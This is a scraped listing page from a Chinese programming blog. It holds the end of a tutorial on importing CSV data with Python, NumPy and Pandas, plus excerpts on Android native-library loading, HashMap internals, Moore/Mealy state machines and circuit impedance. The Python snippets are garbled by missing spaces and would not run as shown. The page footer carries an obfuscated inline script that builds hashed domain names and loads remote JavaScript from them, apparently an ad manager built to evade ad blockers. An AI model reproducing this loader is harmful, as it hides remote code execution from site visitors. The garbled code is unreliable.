readers=reader(raw_data,delimiter=',')
x=list(readers)
data=np.array(x)
print(data)
print(data.shape)
2、通过NumPy导入CSV文件
也可以使用NumPy的loadtxt()函数导入数据。使用这个函数处理的数据没有文件头，并且所有的数据结构都是一样的，也就是说，数据类型是一样的。
1
2
3
4
5
from numpy importloadtxt
filename=input("文件名：")
withopen(filename,'rt',encoding='UTF-8')as raw_data:
data=loadtxt(raw_data,delimiter=',')
print(data)
3、通过Pandas导入CSV文件
通过Pandas来导入CSV文件要使用pandas.read_csv()函数。这个函数的返回值是DataFrame，可以很方便的进行下一步的处理，实际操作过程中推荐使用这种方法。
在机器学习的项目中，经常利用Pandas来做数据清洗与数据准备工作。
1
2
3
4
5
6
from pandas importread_csv
filename=input("文件名：")
f=open(filename,encoding='UTF-8')
names=['作业日期','ηCO','ηH2','TF(℃)','TC(℃)','mass','送风流量']
data=read_csv(f,names=names)
print(data)
总结
以上所述是小编给大家介绍的Python 中导入csv数据的三种方法,希望对大家有所帮助。
来源：https://www.weidianyuedu.com
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2b616378751373c4e00fd074b993a0b6/" rel="bookmark">
			android app调用so 报错 dlopen failed: library “libnativehelper.so“ not found解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、问题现象 android NDK开发过程中，APP调用so库出现如下问题
二、问题原因 主要原因是google在N上对.so库的加载进行了限制，限制了so库指从部分指定的路径进行加载，不在这个路径的so提示 java.lang.UnsatisfiedLinkError: dlopen failed: library “xxx.so” not found 或 java.lang.UnsatisfiedLinkError: dlopen failed: library “/vendor/lib64/xxx.so” needed or dlopened by “/system/lib64/libnativeloader.so” is not accessible for the namespace “classloader-namespace” 或 其他异常错误提示。
N上对so库加载的搜索路径方式为ld_library_path, runtime path, permit path，不在这个搜索路径下则加载失败。从代码层面看，主要是类加载器ClassLoader的相关处理， ​ //code1: (loadedApk.java getClassLoader()) check sdk version // DO NOT SHIP: this is a workaround for apps loading native libraries // provided by 3rd party apps using absolute path instead of corresponding // classloader; see http://b/26954419 for example.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2b616378751373c4e00fd074b993a0b6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1f46e6dada12272eaee4b8d0a940d80/" rel="bookmark">
			HashMap 和 currentHashMap
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、什么是哈希表
在讨论哈希表之前，我们先大概了解下其他数据结构在新增，查找等基础操作执行性能
数组 采用一段连续的存储单元来存储数据。对于指定下标的查找，时间复杂度为O(1)；
通过给定值进行查找，需要遍历数组，逐一比对给定关键字和数组元素，时间复杂度为O(n)，当然，对于有序数组，则可采用二分查找，插值查找，斐波那契查找等方式，可将查找复杂度提高为O(logn)；
对于一般的插入删除操作，涉及到数组元素的移动，其平均复杂度也为O(n)
线性链表 对于链表的新增，删除等操作（在找到指定操作位置后），仅需处理结点间的引用即可，时间复杂度为O(1)，而查找操作需要遍历链表逐一进行比对，复杂度为O(n) 二叉树 对一棵相对平衡的有序二叉树，对其进行插入，查找，删除等操作，平均复杂度均为O(logn)。
数组 相比上述几种数据结构，在哈希表中进行添加，删除，查找等操作，性能十分之高，不考虑哈希冲突的情况下，仅需一次定位即可完成，时间复杂度为O(1).
哈希表上面的特性，哈希表的主干就是数组。
比如我们要新增或查找某个元素，我们通过把当前元素的关键字 通过某个函数映射到数组中的某个位置，通过数组下标一次定位就可完成操作。
存储位置 = f(关键字)
其中，这个函数f一般称为哈希函数，这个函数的设计好坏会直接影响到哈希表的优劣。查找操作同理，先通过哈希函数计算出实际存储地址，然后从数组中对应地址取出即可。
二、哈希冲突
通过哈希函数得出的实际存储地址相同怎么办？也就是说，当我们对某个元素进行哈希运算，得到一个存储地址，然后要进行插入的时候，发现已经被其他元素占用了，其实这就是所谓的哈希冲突，也叫哈希碰撞。为什么要重写 hashcode 和 equals 方法？这篇也推荐看下。
哈希函数的设计至关重要，好的哈希函数会尽可能地保证 计算简单和散列地址分布均匀,但是不可能设计出一个绝对完美的哈希函数，我们需要清楚的是，数组是一块连续的固定长度的内存空间，再好的哈希函数也不能保证得到的存储地址绝对不发生冲突。
哈希冲突的解决方案有多种:开放定址法（发生冲突，继续寻找下一块未被占用的存储地址），再散列函数法，链地址法，HashMap即是采用了链地址法.
JDK7 使用了数组+链表的方式
JDK8 使用了数组+链表+红黑树的方式
三、HashMap的实现原理
HashMap的主干是一个Entry数组。Entry是HashMap的基本组成单元，每一个Entry包含一个key-value键值对。
transient Entry&lt;K,V&gt;[] table = (Entry&lt;K,V&gt;[]) EMPTY_TABLE; Entry是HashMap中的一个静态内部类。
static class Entry&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; { final K key; V value; Entry&lt;K,V&gt; next; //存储指向下一个Entry的引用，单链表结构 int hash; //对key的hashcode值进行hash运算后得到的值，存储在Entry，避免重复计算 /** * Creates new entry. */ Entry( int h, K k, V v, Entry&lt;K,V&gt; n) { value = v; next = n; key = k; hash = h; } HashMap的整体结构如下:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e1f46e6dada12272eaee4b8d0a940d80/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95361816a3e693b6799546c687109865/" rel="bookmark">
			浅谈Moore型和Mealy型以及序列检测状态图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、基本概念1. 数电中关于时序逻辑电路的分类2.Mealy型电路和Moore型电路的区别3.Mealy型有限状态机和Moore型有限状态机的框图 二、一个简单的序列检测：可重叠，不可重叠的Mealy型和Moore型状态图1.可重叠的Moore型状态图2.不可重叠的Moore型状态图3.可重叠的Mealy型状态图4.不可重叠的Mealy型状态图 一、基本概念 1. 数电中关于时序逻辑电路的分类 时序逻辑电路通常可按电路的状态变化特点或电路的输出信号特点进行分类。
按照电路的状态变化特点可分为：同步时序逻辑电路和异步时序逻辑电路。按照电路的输出信号特点可分为：Mealy型时序逻辑电路和Moore型时序逻辑电路。 2.Mealy型电路和Moore型电路的区别 Moore型：Moore型电路的输出只是状态函数，输出表达式中不含输入变量，输入改变时，输出并不变化；只在输入改变，且时钟出现后，由状态的改变引起输出发生改变。
Mealy型：Mealy型电路的输出是输入和现态的函数，当输入改变时，输出随之改变，尽管电路状态可能由于时钟未出现而未改变。Mealy型电路输入改变，输出随之改变的特性，一方面使得Mealy型电路的输出能对输入改变做出快速响应，但另一方面又使Mealy型电路的输出序列中可能出现短暂的多余脉冲。
Moore型电路比Mealy型电路滞后一个时钟周期，而对同一功能的Moore型电路和Mealy型电路，它们的输出序列本身是相同的，只是Mealy型电路比Moore型电路的输出序列超前一个时钟周期出现
3.Mealy型有限状态机和Moore型有限状态机的框图 如图（a） Mealy型:输出是外部信号和电路状态的函数。如图（b） Moore型:输出只是电路状态的函数。 二、一个简单的序列检测：可重叠，不可重叠的Mealy型和Moore型状态图 如题：画出101序列检测的状态图，凡收到输入序列101时，输出为1；
输入序列为：010101101
可重叠输出序列为 ：000101001
不可重叠输出序列为：000001001
1.可重叠的Moore型状态图 2.不可重叠的Moore型状态图 3.可重叠的Mealy型状态图 4.不可重叠的Mealy型状态图 下篇博文介绍：Verilog实现基于状态机的序列检测
https://www.cnblogs.com/zqh1126/p/17050745.html
本篇随笔为学习记录所用，如有错误，请各位指正批评。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f624c2ce7ce55733141eb73881bbe36/" rel="bookmark">
			关于电路的输入阻抗和输出阻抗
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 输入阻抗和输出阻抗的简介输入阻抗（input impedance）输出阻抗（output impedance） 输入阻抗和输出阻抗的简介 输入阻抗和输出阻抗是相对的。阻抗，简单的说就是阻碍作用，是广义上的等效电阻。阻抗是电路或设备对电流的阻力，输出阻抗是在出口处测得的阻抗。阻抗越小，驱动更大负载的能力就越高。引入输入阻抗和输出阻抗这两个词，最大的目的是在设计电路中，要提高效率，即要达到阻抗匹配，达到最佳效果。
由上也可以得出：输入阻抗和输出阻抗实际上就是等效电阻，单位与电阻相同。
输入阻抗（input impedance） 输入阻抗：是指一个电阻输入端的等效阻抗。在输入端加上一个电压源U，测量输入端的电流I，则输入阻抗Rin就是U/I。可以把输入端想象成一个电阻的两端，这个电阻的阻值就是输入阻抗。对于电压驱动型的电路，输入阻抗越大，则对电压源的负载就越轻，因而就越容易驱动，也不会对电压源产生影响。而对于电流驱动型的电路，输入阻抗越小，则对电流源的负载就越轻。 因此，我们可以这样认为：如果是用电压源驱动的，则输入阻抗越大越好。如果是采用电流源来驱动的，则阻抗越小越好。（备注：该理论只适合低频电路，在高配电路中，还需要考虑阻抗匹配的问题。同时如果需要考虑到获取最大的输出功率，也需要考虑阻抗匹配的问题）
输出阻抗（output impedance） 输出阻抗： 含独立电源网络输出端口的等效电压源（戴维南等效电路）或等效电流源（诺顿等效电路）的内阻抗。其值等于独立电源置零时，从输出端口视入的输入阻抗。输出阻抗是一个信号源的内阻。无论信号源或放大器还有电源，都有输出阻抗的问题。对于一个理想的电压源来说，内阻应该为0，对于一个理想的电流源来说，内阻应该为无穷大。但是在实际的电路设计中，是不存在这样的现象的。对于实际中的电压源，常用一个理想电压源串联一个电阻r的方式来等效一个实际的电压源。这个电阻r就是输出阻抗了。当使用电压源给负载供电的时候，就会有电流I流过负载，同时这个电流也会在内阻r上产生一个电压降，这样就导致电压源输出的电压大于负载两端的电压，也就是限制了最大的输出功率。
在同样的输入电压的情况下，如果输入阻抗很低，就需要流过较大电流，这就要考验前级的电流输出能力了;而如果输入阻抗很高，那么只需要很小的电流，这就为前级的电流输出能力减少了很大负担。所以电路设计中尽量提高输入阻抗。
本篇随笔为记录学习所用，内容来自网络整理，如有错误，请各位指正批评。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/153/">«</a>
	<span class="pagination__item pagination__item--current">154/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/155/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>